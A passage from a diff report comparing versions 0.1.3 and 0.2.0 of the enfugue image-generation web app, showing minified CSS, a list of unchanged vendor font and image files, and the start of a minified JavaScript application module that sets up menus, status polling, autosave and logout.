ease-in-out}enfugue-node-editor-position-reset:hover,enfugue-node-editor-zoom-reset:hover{background-color:hsla(0,0%,100%,.1)}enfugue-node-editor-position-reset{margin-left:5px}enfugue-node-editor-zoom-reset{margin-right:5px}enfugue-node-editor-zoom{right:5px}enfugue-node-editor-zoom-readout:after{content:"×"}enfugue-node-editor-zoom-in,enfugue-node-editor-zoom-out{cursor:pointer;margin-right:5px}enfugue-node{align-items:stretch;display:flex;flex-flow:row nowrap;justify-content:stretch;padding:10px;pointer-events:all;position:absolute;transition:transform .25s ease-out;z-index:1}enfugue-node.minimized{pointer-events:none;transition:all .25s ease-in}enfugue-node.focused{z-index:2}enfugue-node-container{align-items:stretch;background-color:var(--darkest-color);border:1px solid #000;border-radius:4px;display:block;flex-flow:column nowrap;justify-content:stretch;overflow:hidden;width:100%}enfugue-node.input-output>enfugue-node-container{background-color:#153131;color:var(--lightest-color)}enfugue-node-header,enfugue-windows-toolbar-item{align-items:center;background-color:var(--darker-color);color:var(--lightest-color);display:flex;flex-flow:row nowrap;flex-grow:0;font-size:14px;justify-content:stretch;overflow:hidden;padding:0 5px;transition:background-color .2s ease-in-out,height .2s ease-in-out;z-index:10}enfugue-node.flipped enfugue-node-header{bottom:0}enfugue-windows-toolbar-item{cursor:pointer;height:30px}enfugue-node-header:hover,enfugue-windows-toolbar-item:hover{background-color:var(--dark-color)}enfugue-node-name,enfugue-windows-toolbar-item-name{flex-grow:1;font-family:var(--monospace-font),monospace;margin-right:5px}enfugue-node-button,enfugue-windows-toolbar-item-button{cursor:pointer;flex-grow:0;margin:0 3px;transition:color .25s ease-in-out;z-index:10}enfugue-node-button:hover,enfugue-windows-toolbar-item-button:hover{color:var(--theme-color-primary)}enfugue-windows-toolbar{background-color:var(--dark-color);border-bottom:1px solid rgba(0,0,0,.2);border-top:1px solid hsla(0,0%,100%,.1);bottom:0;display:flex;flex-flow:row wrap;gap:1px;left:0;min-height:30px;pointer-events:all;position:absolute;right:0}enfugue-node-contents{display:block;flex-grow:1;overflow:auto;position:relative;width:100%}enfugue-node-contents h1,enfugue-node-contents h2,enfugue-node-contents h3{margin:1rem 0 0 1rem}enfugue-node-editor.image-editor enfugue-node.hide-header enfugue-node-header{background-color:rgba(0,0,0,.4);background-image:linear-gradient(180deg,rgba(0,0,0,.7),transparent);position:absolute;width:100%}enfugue-node-editor.image-editor enfugue-node.hide-header enfugue-node-header:hover{background-color:rgba(0,0,0,.6)}enfugue-node-editor.image-editor enfugue-node-container{background:transparent;border-radius:0;border-width:0;position:relative}enfugue-node-editor.image-editor enfugue-node:hover enfugue-node-container{background:hsla(0,0%,100%,.02)}enfugue-node-editor.image-editor enfugue-node-contents{overflow:hidden}enfugue-node-editor.image-editor enfugue-node-contents enfugue-background-image-view{display:block;height:100%;position:relative;width:100%;z-index:-1}enfugue-node-editor.image-editor enfugue-node-contents enfugue-background-image-view .background{background-position:0 0;background-repeat:no-repeat;background-size:auto}enfugue-node-editor.image-editor enfugue-node-contents enfugue-background-image-view.fit-actual .background{background-size:auto}enfugue-node-editor.image-editor enfugue-node-contents enfugue-background-image-view.fit-stretch .background{background-size:100% 100%}enfugue-node-editor.image-editor enfugue-node-contents enfugue-background-image-view.fit-contain .background{background-size:contain}enfugue-node-editor.image-editor enfugue-node-contents enfugue-background-image-view.fit-cover .background{background-size:cover}enfugue-node-editor.image-editor enfugue-node-contents enfugue-background-image-view.anchor-top-left .background{background-position:0 0}enfugue-node-editor.image-editor enfugue-node-contents enfugue-background-image-view.anchor-top-center .background{background-position:top}enfugue-node-editor.image-editor enfugue-node-contents enfugue-background-image-view.anchor-top-right .background{background-position:100% 0}enfugue-node-editor.image-editor enfugue-node-contents enfugue-background-image-view.anchor-center-left .background{background-position:0}enfugue-node-editor.image-editor enfugue-node-contents enfugue-background-image-view.anchor-center-center .background{background-position:50%}enfugue-node-editor.image-editor enfugue-node-contents enfugue-background-image-view.anchor-center-right .background{background-position:100%}enfugue-node-editor.image-editor enfugue-node-contents enfugue-background-image-view.anchor-bottom-left .background{background-position:0 100%}enfugue-node-editor.image-editor enfugue-node-contents enfugue-background-image-view.anchor-bottom-center .background{background-position:bottom}enfugue-node-editor.image-editor enfugue-node-contents enfugue-background-image-view.anchor-bottom-right .background{background-position:100% 100%}enfugue-node-editor.image-editor enfugue-node-header enfugue-node-button.top-right{transform:rotate(90deg)}enfugue-node-editor.image-editor enfugue-node-header enfugue-node-button.bottom-right{transform:rotate(180deg)}enfugue-node-editor.image-editor enfugue-node-header enfugue-node-button.bottom-left{transform:rotate(270deg)}enfugue-node-editor.image-editor enfugue-node-canvas .current-invocation-image-view{left:0;position:absolute;top:0}enfugue-node-editor.image-editor.zoom-out enfugue-node-canvas .current-invocation-image-view,enfugue-node-editor.image-editor.zoom-out enfugue-node-canvas enfugue-background-image-view{image-rendering:auto}enfugue-node-editor.image-editor.zoom-in enfugue-node-canvas .current-invocation-image-view,enfugue-node-editor.image-editor.zoom-in enfugue-node-canvas enfugue-background-image-view{image-rendering:pixelated}enfugue-node-editor.image-editor enfugue-node-canvas{background:none;border:1px solid var(--dark-color);box-sizing:content-box}enfugue-node-editor.image-editor enfugue-node-canvas enfugue-image-editor-grid{background-color:transparent;background:linear-gradient(90deg,hsla(0,0%,100%,.1) 0,hsla(0,0%,100%,.1) 1px,transparent 0) 0 0,linear-gradient(90deg,hsla(0,0%,100%,.02) 0,hsla(0,0%,100%,.02) 1px,transparent 0) 0 0,linear-gradient(180deg,hsla(0,0%,100%,.1) 0,hsla(0,0%,100%,.1) 1px,transparent 0) 0 0,linear-gradient(180deg,hsla(0,0%,100%,.02) 0,hsla(0,0%,100%,.02) 1px,transparent 0) 0 0;background-position:-.5px -.5px;background-size:64px 64px,8px 8px,64px 64px,8px 8px;height:100%;left:0;opacity:1;pointer-events:none;position:absolute;top:0;transition:.1s ease-in-out;width:100%;z-index:2}enfugue-node-editor.image-editor.has-image enfugue-node-canvas enfugue-image-editor-grid{opacity:0}enfugue-node-editor.image-editor.has-image enfugue-node-canvas:hover enfugue-image-editor-grid{opacity:1}enfugue-node-editor.image-editor.has-image enfugue-node-canvas enfugue-node{display:none}enfugue-node-editor.image-editor enfugue-invocation-loading{border:1px solid var(--dark-color);border-radius:10px;bottom:5px;display:block;height:20px;left:175px;line-height:18px;position:absolute;right:175px;transition:all .25s ease-in-out;z-index:1}enfugue-node-editor.image-editor enfugue-invocation-sample-chooser{align-items:center;bottom:30px;display:flex;flex-flow:row nowrap;gap:5px;justify-content:center;left:175px;position:absolute;right:175px}enfugue-node-editor.image-editor enfugue-invocation-sample-chooser enfugue-invocation-sample{align-items:center;border:1px solid var(--dark-color);border-radius:2px;cursor:pointer;display:flex;flex-flow:row nowrap;height:100px;justify-content:center;opacity:.7;transition:all .25s ease-in-out}enfugue-node-editor.image-editor enfugue-invocation-sample-chooser enfugue-invocation-sample:hover{opacity:.9}enfugue-node-editor.image-editor enfugue-invocation-sample-chooser enfugue-invocation-sample:active{opacity:1}enfugue-node-editor.image-editor enfugue-invocation-sample-chooser enfugue-invocation-sample.no-sample{color:var(--dark-color);font-size:100px;width:100px}enfugue-node-editor.image-editor enfugue-invocation-sample-chooser enfugue-invocation-sample img{max-height:100px}enfugue-engine-stop{background-color:var(--theme-color-primary);background-image:linear-gradient(0deg,rgba(0,0,0,.3) 10%,hsla(0,0%,100%,.1) 90%);color:#fff;cursor:not-allowed;display:block;filter:grayscale(100%);font-size:11px;height:35px;line-height:35px;opacity:0;padding:0 10px;pointer-events:none;position:absolute;right:0;text-align:center;text-transform:uppercase;top:0;transition:all .25s ease-in-out;z-index:6}enfugue-engine-stop.ready{cursor:pointer;filter:grayscale(0);opacity:1;pointer-events:all}enfugue-engine-stop.ready:hover{background-color:var(--theme-color-secondary)}enfugue-engine-stop.ready:active{background-image:linear-gradient(180deg,rgba(0,0,0,.3) 10%,hsla(0,0%,100%,.1) 90%)}enfugue-node-editor.image-editor enfugue-invocation-loading{align-items:center;display:flex;flex-flow:row nowrap;justify-content:space-between;overflow:hidden}enfugue-node-editor.image-editor enfugue-invocation-loading enfugue-invocation-loaded{display:block;height:100%;opacity:0;position:absolute;transition:all .1s linear;z-index:-1}enfugue-node-editor.image-editor enfugue-invocation-loading.loading enfugue-invocation-loaded{opacity:1}enfugue-node-editor.image-editor enfugue-invocation-loading enfugue-invocation-duration,enfugue-node-editor.image-editor enfugue-invocation-loading enfugue-invocation-iterations,enfugue-node-editor.image-editor enfugue-invocation-loading enfugue-invocation-remaining{bottom:0;color:#fff;display:block;font-size:10px;text-shadow:1px 1px 1px #000;top:0}enfugue-node-editor.image-editor enfugue-invocation-loading enfugue-invocation-duration{margin-left:5px}enfugue-node-editor.image-editor enfugue-invocation-loading enfugue-invocation-iterations{margin-left:5px;margin-right:5px}enfugue-node-editor.image-editor enfugue-invocation-loading enfugue-invocation-remaining{margin-right:5px}enfugue-node-editor.image-editor enfugue-node form{font-size:11px;height:0;opacity:0;overflow-y:auto;padding-bottom:1em;position:absolute;top:0;transition:all .25s ease-in-out;width:100%}enfugue-node-editor.image-editor enfugue-node.image-editor-prompt-node-view form{background-color:var(--dark-color)!important;height:100%!important;opacity:1!important;top:0!important}enfugue-node-editor.image-editor enfugue-node.image-editor-image-node-view enfugue-scribble-view{opacity:.5}enfugue-node-editor.image-editor enfugue-node.flipped form{bottom:0;top:auto}enfugue-node-editor.image-editor enfugue-node form input,enfugue-node-editor.image-editor enfugue-node form label,enfugue-node-editor.image-editor enfugue-node form select{color:#fff;font-size:11px}enfugue-node-editor.image-editor enfugue-node form legend{display:none}enfugue-node-editor.image-editor enfugue-node form .field-container{flex-basis:30%}enfugue-node-editor.image-editor enfugue-node form .field-container.checkbox-input-view,enfugue-node-editor.image-editor enfugue-node form .field-container.image-editor-image-anchor-input-view,enfugue-node-editor.image-editor enfugue-node form .field-container.image-editor-image-fit-input-view,enfugue-node-editor.image-editor enfugue-node form .field-container.text-input-view{flex-basis:40%}enfugue-node-editor.image-editor enfugue-node:hover form{background-color:rgba(0,0,0,.4);height:calc(100% - 30px);opacity:1;top:30px}enfugue-node-editor.image-editor enfugue-node.flipped:hover form{bottom:30px;top:auto}enfugue-node-editor.image-editor enfugue-node:hover form:hover{background-color:rgba(0,0,0,.6)}enfugue-node-editor.image-editor enfugue-node-canvas enfugue-toolbar{background-color:transparent;background-image:linear-gradient(90deg,transparent,rgba(0,0,0,.4));border:none;bottom:0;left:auto;right:0;top:0}enfugue-node-editor.image-editor enfugue-node-canvas enfugue-toolbar-item{background:none;border:none;opacity:.5;transition:all .25s ease-in-out}enfugue-node-editor.image-editor enfugue-node-canvas enfugue-toolbar-item:active,enfugue-node-editor.image-editor enfugue-node-canvas enfugue-toolbar-item:hover{border:none;opacity:1}enfugue-node-editor.image-editor enfugue-node-canvas enfugue-toolbar-item:after{display:none}.field-container.checkpoint-input-view,.field-container.multi-diffusion-scheduler-input-view,.field-container.multi-inversion-input-view,.field-container.multi-lora-input-view,.field-container.multi-lycoris-input-view,.field-container.scheduler-input-view,.field-container.upscale-diffusion-guidance-scale-input-view,.field-container.upscale-diffusion-negative-prompt-input-view,.field-container.upscale-diffusion-prompt-input-view,.field-container.upscale-diffusion-steps-input-view,.field-container.upscale-methods-input-view,fieldset.field-set-diffusion .field-container,fieldset.field-set-directories .field-container,fieldset.field-set-engine .field-container,fieldset.field-set-filters .field-container.string-input-view-search,fieldset.field-set-prompts .field-container{flex-basis:100%}fieldset.field-set-engine .inpainter-engine-size-input-view,fieldset.field-set-engine .refiner-engine-size-input-view{display:none}form.show-inpainter fieldset.field-set-engine:not(.collapsed) .inpainter-engine-size-input-view,form.show-refiner fieldset.field-set-engine:not(.collapsed) .refiner-engine-size-input-view{display:flex}fieldset.field-set-prompts .field-container{margin-bottom:1em}.field-container.multi-lora-input-view legend,.field-container.multi-lycoris-input-view legend{display:none}.field-container.multi-lora-input-view form .field-container,.field-container.multi-lycoris-input-view form .field-container{flex-basis:100%}enfugue-model-table{display:flex;flex-flow:column nowrap;justify-content:space-between}enfugue-model-table-paging{align-items:center;display:flex;flex-flow:row nowrap;justify-content:space-between;padding:5px 1em 0}enfugue-model-table-paging>span{color:var(--theme-color-tertiary);font-size:12px}enfugue-model-table-paging ul{display:flex;flex-flow:row nowrap;gap:5px}enfugue-model-table-paging ul li{align-items:center;background-color:var(--theme-color-tertiary);border-radius:3px;color:#fff;cursor:pointer;display:flex;flex-flow:row nowrap;height:25px;justify-content:center;line-height:25px;position:relative;text-align:center;transition:background-color .25s ease-in-out;width:25px}enfugue-model-table-paging ul li.selected{background-color:var(--theme-color-secondary)}enfugue-model-table-paging ul li span{font-family:var(--monospace-font),monospace}enfugue-model-table ul.include-first li:first-child{margin-right:30px}enfugue-model-table ul.include-first li:first-child:after{color:var(--theme-color-tertiary);content:"…";font-size:16px;left:calc(100% + 11px);position:absolute}enfugue-model-table ul.include-last li:last-child{margin-left:30px}enfugue-model-table ul.include-last li:last-child:after{color:var(--theme-color-tertiary);content:"…";font-size:16px;position:absolute;right:calc(100% + 11px)}enfugue-model-table-paging ul li:before{background-color:#fff;bottom:0;content:"\A";left:0;opacity:0;pointer-events:none;position:absolute;right:0;top:0;transition:opacity .25s ease-in-out}enfugue-model-table-paging ul li:hover:before{opacity:.1}enfugue-invocation-outputs{display:flex;flex-flow:row nowrap;gap:5px}enfugue-model-table.invocation-history tr td:first-child,enfugue-model-table.invocation-history tr td:nth-child(2),enfugue-model-table.invocation-history tr th:first-child,enfugue-model-table.invocation-history tr th:nth-child(2){width:15%}enfugue-model-table.invocation-history tr td:nth-child(3),enfugue-model-table.invocation-history tr th:nth-child(3){width:25%}enfugue-model-table.invocation-history tr td:nth-child(4),enfugue-model-table.invocation-history tr th:nth-child(4){width:35%}div.about-view>p,div.announcements-view>.view>p{line-height:1.1em;margin:1rem 0 0 1rem}div.announcements-view>.view>h3{color:var(--theme-color-tertiary);margin:1rem 0 0 1rem;text-align:left}div.about-view .donate-links{align-items:stretch;display:flex;flex-flow:row nowrap;gap:1em;justify-content:stretch;margin-top:1em;padding:.5em 1em}div.about-view .donate-links a{border-radius:5px;border-style:solid;border-width:2px;color:#fff;display:block;flex-basis:100%;font-weight:900;padding:1em;text-decoration:none;transition:all .25s ease-in-out}div.about-view .donate-links a:before{background-position:50%;background-repeat:no-repeat;background-size:contain;content:"\A";display:inline-block;height:25px;margin-right:10px;vertical-align:middle;width:25px}div.about-view .donate-links a.patreon{background-color:#ee614a;border-color:#ee614a}div.about-view .donate-links a.ko-fi{background-color:#29abe0;border-color:#29abe0}div.about-view .donate-links a.patreon:before{background-image:url(../img/brand/patreon.png)}div.about-view .donate-links a.ko-fi:before{background-image:url(../img/brand/ko-fi.png)}div.about-view .donate-links a:hover{background-color:transparent}div.about-view .donate-links a.patreon:hover{color:#ee614a}div.about-view .donate-links a.ko-fi:hover{color:#29abe0}div.history-view>input{float:right;margin:1em 1em 0 0}table.history-table-view tr td:first-child,table.history-table-view tr th:first-child,table.log-table-view tr td:first-child,table.log-table-view tr th:first-child{width:150px}table.log-table-view tr td:nth-child(2),table.log-table-view tr td:nth-child(3),table.log-table-view tr th:nth-child(2),table.log-table-view tr th:nth-child(3){width:80px}table.installation-directory-summary-table-view tr td:first-child,table.installation-directory-summary-table-view tr th:first-child{width:250px}input.new-model-input-view,input.new-user-input-view,input.upload-file-input-view{float:right;margin-right:1em}input.upload-file-input-view{margin-top:1em}input.download-input-view{margin:1em;width:calc(100% - 2em)}enfugue-log-glance-view{display:block;max-width:450px;opacity:.5;overflow:hidden;padding:0 5px 5px 0;position:absolute;right:300px;top:40px;transition:opacity .25s ease-in-out;width:calc(50vw - 170px);z-index:4}enfugue-log-glance-view:hover{opacity:1}enfugue-log-glance-view .log-header{align-items:center;display:flex;flex-flow:row nowrap;justify-content:space-between;margin-bottom:2px}enfugue-log-glance-view .log-header a,enfugue-log-glance-view .log-header h2{font-size:12px;font-weight:700;margin:0;padding:0}enfugue-log-glance-view .log-header h2{text-transform:uppercase}enfugue-log-glance-view .log-header a{pointer-events:auto}enfugue-log-glance-view .logs{font-family:var(--monospace-font);font-size:11px;max-height:80px;overflow:hidden;white-space:pre-wrap}enfugue-invocation-outputs enfugue-invocation-output{cursor:pointer}enfugue-invocation-outputs enfugue-invocation-output img{max-height:50px}
```

### Comparing `enfugue-0.1.3/enfugue/static/css/vendor/fa/brands.min.css` & `enfugue-0.2.0/enfugue/static/css/vendor/fa/brands.min.css`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/css/vendor/fa/fontawesome.min.css` & `enfugue-0.2.0/enfugue/static/css/vendor/fa/fontawesome.min.css`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/css/vendor/fa/regular.min.css` & `enfugue-0.2.0/enfugue/static/css/vendor/fa/regular.min.css`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/css/vendor/fa/solid.min.css` & `enfugue-0.2.0/enfugue/static/css/vendor/fa/solid.min.css`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/fonts/vendor/fa/fa-brands-400.ttf` & `enfugue-0.2.0/enfugue/static/fonts/vendor/fa/fa-brands-400.ttf`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/fonts/vendor/fa/fa-brands-400.woff2` & `enfugue-0.2.0/enfugue/static/fonts/vendor/fa/fa-brands-400.woff2`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/fonts/vendor/fa/fa-regular-400.ttf` & `enfugue-0.2.0/enfugue/static/fonts/vendor/fa/fa-regular-400.ttf`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/fonts/vendor/fa/fa-regular-400.woff2` & `enfugue-0.2.0/enfugue/static/fonts/vendor/fa/fa-regular-400.woff2`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/fonts/vendor/fa/fa-solid-900.ttf` & `enfugue-0.2.0/enfugue/static/fonts/vendor/fa/fa-solid-900.ttf`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/fonts/vendor/fa/fa-solid-900.woff2` & `enfugue-0.2.0/enfugue/static/fonts/vendor/fa/fa-solid-900.woff2`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/html/body/content/content-login.html.j2` & `enfugue-0.2.0/enfugue/static/html/body/content/content-login.html.j2`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/html/body/footer/footer.html.j2` & `enfugue-0.2.0/enfugue/static/html/body/footer/footer.html.j2`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/html/head/head-base.html.j2` & `enfugue-0.2.0/enfugue/static/html/head/head-base.html.j2`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/img/brand/civit-ai-logo.svg` & `enfugue-0.2.0/enfugue/static/img/brand/civit-ai-logo.svg`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/img/brand/civit-ai.png` & `enfugue-0.2.0/enfugue/static/img/brand/civit-ai.png`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/img/brand/ko-fi.png` & `enfugue-0.2.0/enfugue/static/img/brand/ko-fi.png`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/img/brand/patreon.png` & `enfugue-0.2.0/enfugue/static/img/brand/patreon.png`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/img/brand/tensorrt.png` & `enfugue-0.2.0/enfugue/static/img/brand/tensorrt.png`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/img/cloud-320.png` & `enfugue-0.2.0/enfugue/static/img/cloud-320.png`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/img/favicon/favicon-128x128.png` & `enfugue-0.2.0/enfugue/static/img/favicon/favicon-128x128.png`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/img/favicon/favicon-16x16.png` & `enfugue-0.2.0/enfugue/static/img/favicon/favicon-16x16.png`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/img/favicon/favicon-256x256.png` & `enfugue-0.2.0/enfugue/static/img/favicon/favicon-256x256.png`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/img/favicon/favicon-32x32.png` & `enfugue-0.2.0/enfugue/static/img/favicon/favicon-32x32.png`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/img/favicon/favicon-512x512.png` & `enfugue-0.2.0/enfugue/static/img/favicon/favicon-512x512.png`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/img/favicon/favicon-64x64.png` & `enfugue-0.2.0/enfugue/static/img/favicon/favicon-64x64.png`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/img/favicon/favicon.ico` & `enfugue-0.2.0/enfugue/static/img/favicon/favicon.ico`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/application/index.mjs` & `enfugue-0.2.0/enfugue/static/js/application/index.mjs`

 * *Files 6% similar despite different names*

```diff
@@ -1 +1 @@
-import{isEmpty,getQueryParameters,getDataParameters,waitFor,createEvent}from"../base/helpers.mjs";import{Publisher}from"../base/publisher.mjs";import{TooltipHelper}from"../common/tooltip.mjs";import{MenuView,SidebarView,ToolbarView}from"../view/menu.mjs";import{StatusView}from"../view/status.mjs";import{NotificationCenterView}from"../view/notifications.mjs";import{WindowsView}from"../view/nodes/windows.mjs";import{ImageEditorView,ImageEditorNodeView,ImageEditorImageNodeView}from"../view/nodes/image-editor.mjs";import{ImageView}from"../view/image.mjs";import{Model}from"../model/enfugue.mjs";import{ConfirmFormView,YesNoFormView}from"../view/forms/confirm.mjs";import{View}from"../view/base.mjs";import{FormView}from"../view/forms/base.mjs";import{StringInputView}from"../view/forms/input.mjs";import{InvocationController}from"../controller/common/invocation.mjs";import{ModelPickerController}from"../controller/common/model-picker.mjs";import{ModelManagerController}from"../controller/common/model-manager.mjs";import{DownloadsController}from"../controller/common/downloads.mjs";import{AnnouncementsController}from"../controller/common/announcements.mjs";import{HistoryDatabase}from"../common/history.mjs";import{SimpleNotification}from"../common/notify.mjs";class FileNameFormView extends FormView{static fieldSets={"File Name":{filename:{class:StringInputView,config:{required:!0,placeholder:"Please enter a filename."}}}}}class LogoutButtonView extends View{static tagName="i";static className="fa-solid fa-right-from-bracket logout";async logout(){window.location="/logout"}async build(){let t=await super.build();return t.on("click",(()=>this.logout())),t.data("tooltip","Logout"),t}}class Application{static menuCategories={file:"File"};static adminMenuCategories={models:"Models",system:"System"};static filenameFormInputWidth=400;static filenameFormInputHeight=250;static logoShadowRGB=[0,0,0];static logoShadowOpacity=.5;static logoShadowSteps=10;static logoShadowOffset=2;static logoShadowSpread=0;static confirmViewWidth=500;static confirmViewHeight=200;constructor(t){this.config=t,this.publisher=new Publisher}async initialize(){this.tooltips=new TooltipHelper,this.container=document.querySelector(this.config.view.applicationContainer),isEmpty(this.container)?console.error(`Couldn't find application configuration using selector ${this.config.view.applicationContainer}, abandoning initialization.`):(this.model=new Model(this.config),this.menu=new MenuView(this.config),this.sidebar=new SidebarView(this.config),this.toolbar=new ToolbarView(this.config),this.windows=new WindowsView(this.config),this.notifications=new NotificationCenterView(this.config),this.history=new HistoryDatabase(this.config.history.size,this.config.debug),this.images=new ImageEditorView(this),this.container.appendChild(await this.menu.render()),this.container.appendChild(await this.sidebar.render()),this.container.appendChild(await this.toolbar.render()),this.container.appendChild(await this.images.render()),this.container.appendChild(await this.windows.render()),this.container.appendChild(await this.notifications.render()),await this.startAnimations(),await this.registerModelControllers(),await this.registerDownloadsControllers(),await this.registerInvocationControllers(),await this.registerMenuControllers(),await this.registerSidebarControllers(),await this.registerToolbarControllers(),await this.startAutosave(),await this.startKeepalive(),await this.startAnnouncements(),await this.registerLogout(),window.onpopstate=t=>this.popState(t),document.addEventListener("paste",(t=>this.onPaste(t))),document.addEventListener("keypress",(t=>this.onKeyPress(t))))}async startAnnouncements(){this.announcements=new AnnouncementsController(this),await this.announcements.initialize()}async startAnimations(){let t=document.querySelector("header h1");isEmpty(t)?console.warn("Can't find header logo, not binding animations."):window.addEventListener("mousemove",(e=>{let[i,o]=[e.clientX/window.innerWidth,e.clientY/window.innerHeight],s=[];for(let t=0;t<this.constructor.logoShadowSteps;t++){let[e,n]=[i*(t+1)*this.constructor.logoShadowOffset,o*(t+1)*this.constructor.logoShadowOffset],a=this.constructor.logoShadowOpacity-t/this.constructor.logoShadowSteps*this.constructor.logoShadowOpacity,r=`rgba(${this.constructor.logoShadowRGB.concat(a.toFixed(2)).join(",")})`;s.push(`${e}px ${n}px ${this.constructor.logoShadowSpread}px ${r}`)}t.style.textShadow=s.join(",")}))}async registerModelControllers(){this.modelManager=new ModelManagerController(this),await this.modelManager.initialize(),this.modelPicker=new ModelPickerController(this),await this.modelPicker.initialize()}async registerDownloadsControllers(){this.downloads=new DownloadsController(this),await this.downloads.initialize()}async registerInvocationControllers(){this.engine=new InvocationController(this),await this.engine.initialize()}getMenuCategories(){let t={...this.constructor.menuCategories};return isEmpty(window.enfugue)||!0!==window.enfugue.admin||(t={...t,...this.constructor.adminMenuCategories}),t.help="Help",t}async registerMenuControllers(){let t=this.getMenuCategories();this.menuControllers={};for(let e in t){let i=t[e];this.menuControllers[e]=[];try{let t=await import(`../controller/${e}/index.autogenerated.mjs`),o=await this.menu.addCategory(i);for(let i of t.Index)try{let t=(await import(`../controller/${e}/${i}`)).MenuController;if(isEmpty(t))throw"Module does not provide a 'MenuController' export.";if(!t.isDisabled()){let i=await o.addItem(t.menuName,t.menuIcon),s=new t(this);await s.initialize(),i.onClick((()=>s.onClick())),this.menuControllers[e].push(s)}}catch(t){console.warn("Couldn't import",e,"menu controller",i,t)}}catch(t){console.warn("Couldn't register controllers for menu",e,t)}}}async registerSidebarControllers(){let t=await import("../controller/sidebar/index.autogenerated.mjs");this.sidebarControllers=[];for(let e of t.Index){let t=(await import(`../controller/sidebar/${e}`)).SidebarController;if(isEmpty(t))throw"Module does not provide a 'SidebarController' export.";let i=new t(this);await i.initialize(),this.sidebarControllers.push(i)}}async registerToolbarControllers(){let t=await import("../controller/toolbar/index.autogenerated.mjs");this.toolbarControllers=[];for(let e of t.Index){let t=(await import(`../controller/toolbar/${e}`)).ToolbarController;if(isEmpty(t))throw"Module does not provide a 'ToolbarController' export.";let i=await this.toolbar.addItem(t.menuName,t.menuIcon),o=new t(this);await o.initialize(),i.onClick((()=>o.onClick())),this.toolbarControllers.push(o)}}async startKeepalive(){const t=this.config.model.status.interval||1e4,e=t=>{"ready"===t?this.publish("engineReady"):"busy"===t?this.publish("engineBusy"):"idle"===t?this.publish("engineIdle"):console.warn("Unknown status",t)};let i=document.querySelector("header");if(isEmpty(i))return void console.warn("No header found on page, not appending status view.");let o=await this.model.get(),s=new StatusView(this.config,o),n=await s.getNode();s.onStatusClicked((async()=>{await this.confirm("Stop engine and terminate any active invocations?")&&(await this.model.post("/invocation/stop"),this.notifications.push("info","Stopped","Engine successfully terminated."))})),e(o.status),i.appendChild(n.render()),setInterval((async()=>{try{let t=await this.model.get();o.status!==t.status&&e(t.status),s.updateStatus(t),o=t}catch{s.updateStatus("error")}}),t);let a=await this.model.get("/invocation"),r=null;for(let t of a)if("processing"===t.status){r=t;break}isEmpty(r)||(isEmpty(r)||isEmpty(r.metadata)||isEmpty(r.metadata.tensorrt_build)?(this.notifications.push("info","Active Invocation Found","You have an image currently being generated, beginning monitoring process."),this.engine.canvasInvocation(r.uuid)):this.notifications.push("info","TensorRT Build in Progress",`You have a TensorRT engine build in progress for ${r.metadata.tensorrt_build.model}. You'll receive a notification in this window when it is complete. The engine will remain unavailable until that time.`)),setInterval((async()=>{try{let t,e=await this.model.get("/invocation");for(let i of e)"processing"===i.status&&(null!==r&&r.id===i.id||(t=i)),isEmpty(r)||i.id!==r.id||i.status===r.status||("completed"===i.status?this.publish("invocationComplete",i):this.publish("invocationError",i),r=null);isEmpty(t)||(this.publish("invocationBegin",t),r=t)}catch(t){console.error(t)}}),t)}async registerLogout(){if(!isEmpty(window.enfugue.user)&&"noauth"!==window.enfugue.user){let t=new LogoutButtonView(this.config);document.querySelector("header").appendChild((await t.getNode()).render())}}async startAutosave(){try{let t=await this.history.getCurrentState();isEmpty(t)||(this.setState(t),this.notifications.push("info","Session Restored","Your last autosaved session was successfully loaded."));const e=this.config.model.autosave.interval||3e4;setInterval((()=>this.autosave()),e)}catch(t){console.error(t),this.notifications.push("warning","History Disabled","Couldn't open IndexedDB, history and autosave are disabled.")}}async autosave(t=!0){try{await this.history.setCurrentState(this.getState()),t&&SimpleNotification.notify("Session autosaved!",2e3)}catch(t){console.error("Couldn't autosave",t)}}subscribe(t,e){this.publisher.subscribe(t,e)}unsubscribe(t,e){this.publisher.unsubscribe(t,e)}async publish(t,e=null){this.publisher.publish(t,e)}spawnConfirmForm(t,e,i,o=!0,s=!1){return new Promise((async(n,a)=>{let r,l=!1,h=new t(this.config,i);h.onSubmit((()=>{l=!0,n(!0),o&&r.remove()})),h.onCancel((()=>{l=!0,n(!1),r.remove()})),r=await this.windows.spawnWindow(e,h,this.constructor.confirmViewWidth,this.constructor.confirmViewHeight),r.onClose((()=>{!l&&s?a():n(!1),l=!0}))}))}confirm(t,e=!0){return this.spawnConfirmForm(ConfirmFormView,"Confirm",t,e)}yesNo(t,e=!0){return this.spawnConfirmForm(YesNoFormView,"Yes or No",t,e,!0)}async saveAs(t,e,i,o){let s=new Blob([e],{type:i});return this.saveBlobAs(t,s,o)}async 